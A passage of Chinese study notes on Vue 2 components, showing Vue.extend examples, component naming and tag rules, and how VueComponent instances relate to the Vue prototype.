    <script src="../VuePack/vue.js"></script>
</head>
<body> 
    <div id="root">
        <school></school>
        <hr>
        <student></student>
    </div>

    <div id="root2">
        <hello></hello>
    </div>
    <script>
        const school = Vue.extend({
            template:`
            <div>
            <h2>学校名称：{{schoolName}}</h2>
            <h2>学校地址：{{address}}</h2>
            </div>
            `,
            data() {
                return {
                    schoolName:'asoul',
                    address:'杭州'
                }
            },
        })

        const student = Vue.extend({
            template:`
            <div>
            <h2>学生姓名：{{studentName}}</h2>
            <h2>学生年龄：{{age}}</h2>
            </div>
            `,
            data() {
                return {
                    studentName:'嘉然',
                    age:18
                }
            },
        })

        const hello=Vue.extend({
            template:`
            <div>
            <h2>学生姓名：{{name}}</h2>
            </div>
            `,
            data() {
                return {
                    name:'嘉然'
                }
            },
        })
        
        Vue.component('hello',hello)
        
        
        new Vue({
            el:'#root',
            components:{
                school:school,
                student:student
            }
        })

        new Vue({
            el:'#root2',

        })
    </script>
</body>
</html>
```

## 2.注意点

> 组件名

1. 一个单词组成

   第一种写法(首字母小写):school

   第二种(首字母大写):School

2. 多个单词组成

   第一种(kebab-case):my-school

   第二种(CamelCase):MySchool(需要Vue脚手架)

3. 备注

   组件名回避HTML中已有的元素

   可以使用name配置项指定组件在开发者工具中呈现的名字

> 组件标签

1. <school></school>

2. <school/>

   不使用脚手架时，第二种导致后续组件不能渲染

> 简写方式

​	const school = Vue.extend(options)简写为const school=options

## 3.组件嵌套

关于VueComponent:

1. school组件本质是一个VueComponent的构造函数，不是程序员定义的，Vue.extend生成的

2. 我们只需要写<school></school>，Vue解析时会帮我们创建school组件的实例对象，Vue帮我们执行的：new VueComponet(options)

3. 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent

4. this的指向

   1.组件配置中，

   data、methods中函数、watch函数、computed中函数，this均是【VueComponet实例对象】

   2.new Vue(options)配置中：

   data函数、methods函数、watch函数、computed函数、this均是Vue实例对象

5. VueComponent的实例对象，简称为vc(也可称之为：组件实例对象)

   Vue实例对象，简称vm



## 4.组件的内置关系



```
VueComponent.prototype.__proto__===Vue.prototype
```

因为可以让组件实例对象(vc)可以访问到Vue原型上的属性和方法
